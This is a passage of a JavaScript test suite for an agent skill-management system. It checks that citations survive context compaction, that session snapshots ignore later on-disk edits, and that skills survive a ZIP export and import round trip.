Source 3: Additional evidence from IEEE proceedings.`;

      const compacted = await CompactionShield.protectCompaction(fullContext, (unshielded) => {
        // Aggressive compactor strips all evidence
        return 'Summarized: 3 sources reviewed.';
      });

      // Citation-bearing skill content MUST survive compaction intact
      assert.ok(compacted.includes(shielded), 'Shielded citation content must survive compaction');
      assert.ok(compacted.includes('DOI:10.1038/s41586-024-07001-4'), 'DOI citation must be preserved');
      assert.ok(compacted.includes('https://arxiv.org/abs/2312.04823'), 'arXiv URL must be preserved');
      assert.ok(compacted.includes('[Smith2024]'), 'AuthorYear citation tag must be preserved');
      assert.ok(compacted.includes('[Chen2023]'), 'AuthorYear citation tag must be preserved');
      assert.ok(compacted.includes('Never fabricate citations'), 'Citation policy must be preserved');
    });

    it('verifies citation fidelity through resource snapshot isolation during active sessions', async () => {
      // Create a skill with citation-bearing reference doc
      const skillDir = path.join(tempDir, 'citation-skill');
      const refsDir = path.join(skillDir, 'references');
      await fs.promises.mkdir(refsDir, { recursive: true });
      await fs.promises.writeFile(
        path.join(skillDir, 'SKILL.md'),
        `---
name: citation-skill
description: Skill with verified citation references
---

# Citation Instructions
Always use DOI-verified references from the citation database.`
      );
      await fs.promises.writeFile(
        path.join(refsDir, 'citations.md'),
        `# Verified Citation Database
- [Alpha2024] DOI:10.1000/alpha-2024 — Verified ✓
- [Beta2023] DOI:10.1000/beta-2023 — Verified ✓
- [Gamma2022] DOI:10.1000/gamma-2022 — Verified ✓`
      );

      const pkg = await loadSkillPackage(skillDir, 'workspace');

      // Load citation reference (creates snapshot)
      const citations = await loadSkillResource(pkg, 'references/citations.md');
      assert.ok(citations.includes('[Alpha2024]'));
      assert.ok(citations.includes('[Beta2023]'));
      assert.ok(citations.includes('[Gamma2022]'));
      assert.ok(citations.includes('DOI:10.1000/alpha-2024'));

      // Simulate on-disk mutation (someone replaces citations.md with hallucinated content)
      await fs.promises.writeFile(
        path.join(refsDir, 'citations.md'),
        '# HALLUCINATED CITATIONS\n- [Fake2024] DOI:HALLUCINATED — NOT REAL'
      );

      // Active session MUST still read from snapshot, preserving original citations
      const isolatedCitations = await loadSkillResource(pkg, 'references/citations.md');
      assert.ok(isolatedCitations.includes('[Alpha2024]'), 'Original citation must be preserved');
      assert.ok(isolatedCitations.includes('DOI:10.1000/alpha-2024'), 'Original DOI must be preserved');
      assert.ok(!isolatedCitations.includes('HALLUCINATED'), 'Hallucinated content must not leak in');
    });

    it('verifies SkillManagerService session snapshots protect citation integrity', async () => {
      const skillDir = path.join(tempDir, 'snapshot-citation-skill');
      const refsDir = path.join(skillDir, 'references');
      await fs.promises.mkdir(refsDir, { recursive: true });
      await fs.promises.writeFile(
        path.join(skillDir, 'SKILL.md'),
        '---\nname: snapshot-citation-skill\ndescription: Snapshot citation test\n---\n# Verified Instructions'
      );
      await fs.promises.writeFile(
        path.join(refsDir, 'verified-sources.md'),
        '# Verified Sources\n- Source A: DOI:10.1234/verified-a\n- Source B: DOI:10.1234/verified-b'
      );

      const registry = new SkillRegistry({ workspaceDir: tempDir });
      const service = new SkillManagerService(registry, tempDir);

      const pkg = await loadSkillPackage(skillDir, 'workspace');
      registry.registerDynamic(pkg);

      // Load resources to populate snapshot
      await loadSkillResource(pkg, 'references/verified-sources.md');

      // Take service snapshot
      service.snapshotActiveSkill(pkg);

      // Verify snapshot exists and contains original data
      const snapshot = service.getSessionSnapshot('snapshot-citation-skill');
      assert.ok(snapshot, 'Session snapshot must exist');
      assert.equal(snapshot.name, 'snapshot-citation-skill');
      assert.ok(snapshot.resourceSnapshot.has('references/verified-sources.md'));
      assert.ok(snapshot.resourceSnapshot.get('references/verified-sources.md').includes('DOI:10.1234/verified-a'));
    });
  });

  // ──────────────────────────────────────────────────────────────────────────
  // § 5  Integration: Full Pipeline Validation
  // ──────────────────────────────────────────────────────────────────────────
  describe('Full Pipeline Integration: Cross-Client → Round-Trip → SSE → Gates', () => {
    it('validates the complete pipeline: fixture parse → zip → import → activate → export → verify', async () => {
      // 1. Parse an Anthropic-style fixture
      const fixtureDir = path.resolve(__dirname, 'fixtures', 'skills', 'anthropic-reference-skill');
      const pkg = await loadSkillPackage(fixtureDir, 'workspace');
      assert.equal(pkg.name, 'anthropic-reference-skill');

      // 2. Export as ZIP
      const registry = new SkillRegistry({ workspaceDir: tempDir });
      registry.registerDynamic(pkg);

      const service = new SkillManagerService(registry, tempDir);
      const exported = await service.exportSkill('anthropic-reference-skill');
      assert.ok(Buffer.isBuffer(exported.buffer));

      // 3. Import ZIP into fresh workspace
      const importDir = path.join(tempDir, 'import-workspace');
      await fs.promises.mkdir(importDir, { recursive: true });
      const freshRegistry = new SkillRegistry({ workspaceDir: importDir });
      await freshRegistry.discoverAll();
      const freshService = new SkillManagerService(freshRegistry, importDir);

      const importResult = await freshService.importSkill(exported.buffer, {
        scope: 'workspace',
        collisionAction: 'overwrite',
        workspaceDir: importDir
      });
      assert.equal(importResult.success, true);
      assert.equal(importResult.skillName, 'anthropic-reference-skill');

      // 4. Activate imported skill
      const activationManager = new SkillActivationManager(freshRegistry);
      const activated = await activationManager.preActivateSkills(['anthropic-reference-skill']);
      assert.equal(activated.length, 1);
      assert.ok(activated[0].shieldedContent.includes('Anthropic Reference Skill'));

      // 5. Verify prompt context
      const ctx = activationManager.getPromptContext();
      assert.ok(ctx.includes('<skill_content name="anthropic-reference-skill">'));

      // 6. Re-export and verify content integrity
      const reExported = await freshService.exportSkill('anthropic-reference-skill');
      const reExtracted = readZipArchive(reExported.buffer);
      const reSkill = reExtracted.find(f => f.relativePath === 'SKILL.md');
      assert.ok(reSkill);
      assert.ok(reSkill.content.toString('utf8').includes('name: anthropic-reference-skill'));
    });
  });
});
